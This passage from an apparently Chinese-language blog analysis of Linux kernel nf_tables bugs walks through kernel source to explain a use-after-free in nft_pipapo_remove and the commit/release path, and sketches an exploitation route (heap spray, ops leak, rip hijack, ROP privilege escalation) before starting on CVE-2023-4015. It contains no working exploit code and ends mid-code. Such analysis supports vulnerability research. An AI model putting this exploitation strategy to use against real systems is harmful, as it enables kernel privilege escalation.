&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>前面的逻辑比较简单这里直接看commit的内容，这里主要看<code>nft_setelem_remove</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_setelem_remove</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_set_elem *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (nft_setelem_is_catchall(<span class="built_in">set</span>, elem))</span><br><span class="line">nft_setelem_catchall_remove(net, <span class="built_in">set</span>, elem);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;remove(net, <span class="built_in">set</span>, elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们并不是<code>catchall</code>类型的（看到这个就烦！！！）所以最终会调用<code>set-&gt;ops-&gt;remove</code>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_pipapo_remove</span><span class="params">(<span class="keyword">const</span> struct net *net, <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nft_set_elem *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo</span> *<span class="title">priv</span> =</span> nft_set_priv(<span class="built_in">set</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> *<span class="title">m</span> =</span> priv-&gt;clone;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_elem</span> *<span class="title">e</span> =</span> elem-&gt;priv;</span><br><span class="line"><span class="keyword">int</span> rules_f0, first_rule = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> u8 *data;</span><br><span class="line"></span><br><span class="line">data = (<span class="keyword">const</span> u8 *)nft_set_ext_key(&amp;e-&gt;ext);</span><br><span class="line"></span><br><span class="line">e = pipapo_get(net, <span class="built_in">set</span>, data, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(e))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((rules_f0 = pipapo_rules_same_key(m-&gt;f, first_rule))) &#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">nft_pipapo_map_bucket</span> <span class="title">rulemap</span>[<span class="title">NFT_PIPAPO_MAX_FIELDS</span>];</span></span><br><span class="line"><span class="keyword">const</span> u8 *match_start, *match_end;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> i, start, rules_fx;</span><br><span class="line"></span><br><span class="line">match_start = data;</span><br><span class="line">match_end = (<span class="keyword">const</span> u8 *)nft_set_ext_key_end(&amp;e-&gt;ext)-&gt;data;</span><br><span class="line"></span><br><span class="line">start = first_rule;</span><br><span class="line">rules_fx = rules_f0;</span><br><span class="line"></span><br><span class="line">nft_pipapo_for_each_field(f, i, m) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipapo_match_field(f, start, rules_fx,</span><br><span class="line">match_start, match_end))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">rulemap[i].to = start;</span><br><span class="line">rulemap[i].n = rules_fx;</span><br><span class="line"></span><br><span class="line">rules_fx = f-&gt;mt[start].n;</span><br><span class="line">start = f-&gt;mt[start].to;</span><br><span class="line"></span><br><span class="line">match_start += NFT_PIPAPO_GROUPS_PADDED_SIZE(f);</span><br><span class="line">match_end += NFT_PIPAPO_GROUPS_PADDED_SIZE(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i == m-&gt;field_count) &#123;</span><br><span class="line">priv-&gt;dirty = <span class="literal">true</span>;</span><br><span class="line">pipapo_drop(m, rulemap);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first_rule += rules_f0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的漏洞就发生在<code>nft_pipapo_remove</code>函数中，所以在分析这个函数的同时就一起把漏洞给分析了。</p><p>首先函数开头使用<code>pipapo_get</code>函数通过key拿到对应的element，然后进入到循环中，<strong>注意的是这里会直接强制拿key_end但是在前面insert的时候key_end是可有可无的，如果没有的话key_end会直接等于key</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pipapo_match_field</span><span class="params">(struct nft_pipapo_field *f,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">int</span> first_rule, <span class="keyword">int</span> rule_count,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> u8 *start, <span class="keyword">const</span> u8 *end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 right[NFT_PIPAPO_MAX_BYTES] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">u8 left[NFT_PIPAPO_MAX_BYTES] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">pipapo_get_boundaries(f, first_rule, rule_count, left, right);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !<span class="built_in">memcmp</span>(start, left,</span><br><span class="line">       f-&gt;groups / NFT_PIPAPO_GROUPS_PER_BYTE(f)) &amp;&amp;</span><br><span class="line">       !<span class="built_in">memcmp</span>(end, right, f-&gt;groups / NFT_PIPAPO_GROUPS_PER_BYTE(f));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在这个函数中是永远不会返回true也就是会直接break，无法将目标element给丢弃掉，也就会造成UAF！</p><h3 id="commit-release详细分析"><a href="#commit-release详细分析" class="headerlink" title="commit_release详细分析"></a>commit_release详细分析</h3><p>可以看到在前面会创建trans送入到commit中去，并且最后会调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nft_trans_commit_list_add_tail(ctx-&gt;net, trans);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_trans_commit_list_add_tail</span><span class="params">(struct net *net, struct nft_trans *trans)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (trans-&gt;msg_type) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWSET:</span><br><span class="line"><span class="keyword">if</span> (!nft_trans_set_update(trans) &amp;&amp;</span><br><span class="line">    nft_set_is_anonymous(nft_trans_set(trans)))</span><br><span class="line">list_add_tail(&amp;trans-&gt;binding_list, &amp;nft_net-&gt;binding_list);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWCHAIN:</span><br><span class="line"><span class="keyword">if</span> (!nft_trans_chain_update(trans) &amp;&amp;</span><br><span class="line">    nft_chain_binding(nft_trans_chain(trans)))</span><br><span class="line">list_add_tail(&amp;trans-&gt;binding_list, &amp;nft_net-&gt;binding_list);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list_add_tail(&amp;trans-&gt;<span class="built_in">list</span>, &amp;nft_net-&gt;commit_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数会将trans添加到<code>&amp;nft_net-&gt;commit_list</code>双向链表中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nft_set_commit_update(&amp;set_update_list);</span><br><span class="line"></span><br><span class="line">nft_commit_notify(net, NETLINK_CB(skb).portid);</span><br><span class="line">nf_tables_gen_notify(net, skb, NFT_MSG_NEWGEN);</span><br><span class="line">nf_tables_commit_audit_log(&amp;adl, nft_net-&gt;base_seq);</span><br><span class="line">nf_tables_commit_release(net);</span><br></pre></td></tr></table></figure><p>中间几个函数暂时没有遇到，我也没有详细分析他们的含义，所以这里主要看第一个和最后一个，这段代码是<code>nf_tables_commit</code>函数最后的几行代码，第一函数我们比较熟悉，在前面也是分析过了其内部会调用<code>set-&gt;ops-&gt;commit</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_commit_release</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* all side effects have to be made visible.</span></span><br><span class="line"><span class="comment"> * For example, if a chain named &#x27;foo&#x27; has been deleted, a</span></span><br><span class="line"><span class="comment"> * new transaction must not find it anymore.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory reclaim happens asynchronously from work queue</span></span><br><span class="line"><span class="comment"> * to prevent expensive synchronize_rcu() in commit phase.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;nft_net-&gt;commit_list)) &#123;</span><br><span class="line">nf_tables_module_autoload_cleanup(net);</span><br><span class="line">mutex_unlock(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trans = list_last_entry(&amp;nft_net-&gt;commit_list,</span><br><span class="line">struct nft_trans, <span class="built_in">list</span>);</span><br><span class="line">get_net(trans-&gt;ctx.net);</span><br><span class="line">WARN_ON_ONCE(trans-&gt;put_net);</span><br><span class="line"></span><br><span class="line">trans-&gt;put_net = <span class="literal">true</span>;</span><br><span class="line">spin_lock(&amp;nf_tables_destroy_list_lock);</span><br><span class="line">list_splice_tail_init(&amp;nft_net-&gt;commit_list, &amp;nf_tables_destroy_list);</span><br><span class="line">spin_unlock(&amp;nf_tables_destroy_list_lock);</span><br><span class="line"></span><br><span class="line">nf_tables_module_autoload_cleanup(net);</span><br><span class="line">schedule_work(&amp;trans_destroy_work);</span><br><span class="line"></span><br><span class="line">mutex_unlock(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点关注最后一行代码调用的函数即<code>nf_tables_commit_release</code>函数，可以看到在函数尾部通过<code>list_splice_tail_init</code>函数将<code>&amp;nft_net-&gt;commit_list</code>添加至<code>&amp;nf_tables_destroy_list</code>中去了。</p><p>最后注意最后这里会调用<code>schedule_work</code>函数将<code>trans_destroy_work</code>提交至任务队列中去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_trans_destroy_work</span><span class="params">(struct work_struct *w)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">DECLARE_WORK</span><span class="params">(trans_destroy_work, nf_tables_trans_destroy_work)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_trans_destroy_work</span><span class="params">(struct work_struct *w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>, *<span class="title">next</span>;</span></span><br><span class="line">LIST_HEAD(head);</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;nf_tables_destroy_list_lock);</span><br><span class="line">list_splice_init(&amp;nf_tables_destroy_list, &amp;head);</span><br><span class="line">spin_unlock(&amp;nf_tables_destroy_list_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;head))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">synchronize_rcu();</span><br><span class="line"></span><br><span class="line">list_for_each_entry_safe(trans, next, &amp;head, <span class="built_in">list</span>) &#123;</span><br><span class="line">nft_trans_list_del(trans);</span><br><span class="line">nft_commit_release(trans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在其内部则是将<code>&amp;nf_tables_destroy_list</code>赋值给了head并在后面循环调用了<code>nft_commit_release</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_commit_release</span><span class="params">(struct nft_trans *trans)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (trans-&gt;msg_type) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELTABLE:</span><br><span class="line">nf_tables_table_destroy(&amp;trans-&gt;ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWCHAIN:</span><br><span class="line">free_percpu(nft_trans_chain_stats(trans));</span><br><span class="line">kfree(nft_trans_chain_name(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELCHAIN:</span><br><span class="line">nf_tables_chain_destroy(&amp;trans-&gt;ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELRULE:</span><br><span class="line">nf_tables_rule_destroy(&amp;trans-&gt;ctx, nft_trans_rule(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELSET:</span><br><span class="line">nft_set_destroy(&amp;trans-&gt;ctx, nft_trans_set(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELSETELEM:</span><br><span class="line">nf_tables_set_elem_destroy(&amp;trans-&gt;ctx,</span><br><span class="line">   nft_trans_elem_set(trans),</span><br><span class="line">   nft_trans_elem(trans).priv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELOBJ:</span><br><span class="line">nft_obj_destroy(&amp;trans-&gt;ctx, nft_trans_obj(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELFLOWTABLE:</span><br><span class="line"><span class="keyword">if</span> (nft_trans_flowtable_update(trans))</span><br><span class="line">nft_flowtable_hooks_destroy(&amp;nft_trans_flowtable_hooks(trans));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">nf_tables_flowtable_destroy(nft_trans_flowtable(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trans-&gt;put_net)</span><br><span class="line">put_net(trans-&gt;ctx.net);</span><br><span class="line"></span><br><span class="line">kfree(trans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里就是真正处理delete的位置了，这里以setelem为例，会调用<code>nf_tables_set_elem_destroy</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_set_elem_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>, <span class="keyword">void</span> *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span> =</span> nft_set_elem_ext(<span class="built_in">set</span>, elem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPRESSIONS))</span><br><span class="line">nft_set_elem_expr_destroy(ctx, nft_set_ext_expr(ext));</span><br><span class="line"></span><br><span class="line">kfree(elem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终在这里调用了<code>kfree(elem)</code>。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>该漏洞的利用方法比较简单，因为element的大小是用户态可控的，所以在有UAF的加持下可以很轻松的进行利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_object</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rhlist_head</span><span class="title">rhlhead</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_object_hash_key</span><span class="title">key</span>;</span></span><br><span class="line">u32genmask:<span class="number">2</span>,</span><br><span class="line">use:<span class="number">30</span>;</span><br><span class="line">u64handle;</span><br><span class="line">u16udlen;</span><br><span class="line">u8*udata;</span><br><span class="line"><span class="comment">/* runtime data below here */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_object_ops</span>*<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>data[]</span><br><span class="line">__attribute__((aligned(__alignof__(u64))));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>原作者是利用UAF然后使用堆喷table来占据位置并转化为table的UAF接着使用obj来占用位置，通过<code>get_table</code>来泄露出obj中的ops，最后修改ops来劫持rip，最后使用rop提权。</p><h2 id="CVE-2023-4015"><a href="#CVE-2023-4015" class="headerlink" title="CVE-2023-4015"></a>CVE-2023-4015</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>没错，这又是一个需要一点点前置知识才能完全搞清楚的漏洞。TvT</p><p>在上面那个cve的时候可能有人会有疑惑commit到底是在什么时候被调用的呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv_batch</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">u16 subsys_id, u32 genid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">oskb</span> =</span> skb;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> *<span class="title">ss</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> *<span class="title">nc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> <span class="title">extack</span>;</span></span><br><span class="line">LIST_HEAD(err_list);</span><br><span class="line">u32 status;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nfnl_net</span> *<span class="title">nfnlnet</span> =</span> nfnl_pernet(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">cda</span>[<span class="title">NFNL_MAX_ATTR_COUNT</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(nlh-&gt;nlmsg_type);</span><br><span class="line"><span class="keyword">int</span> attrlen = nlh-&gt;nlmsg_len - min_len;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nfnl_info</span> <span class="title">info</span> =</span> &#123;</span><br><span class="line">.net= net,</span><br><span class="line">.sk= nfnlnet-&gt;nfnl,</span><br><span class="line">.nlh= nlh,</span><br><span class="line">.nfmsg= nlmsg_data(nlh),</span><br><span class="line">.extack= &amp;extack,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity-check NFTA_MAX_ATTR */</span></span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cb[cb_id].attr_count &gt; NFNL_MAX_ATTR_COUNT) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nla_parse_deprecated(cda,</span><br><span class="line">   ss-&gt;cb[cb_id].attr_count,</span><br><span class="line">   attr, attrlen,</span><br><span class="line">   ss-&gt;cb[cb_id].policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line">err = nc-&gt;call(skb, &amp;info, (<span 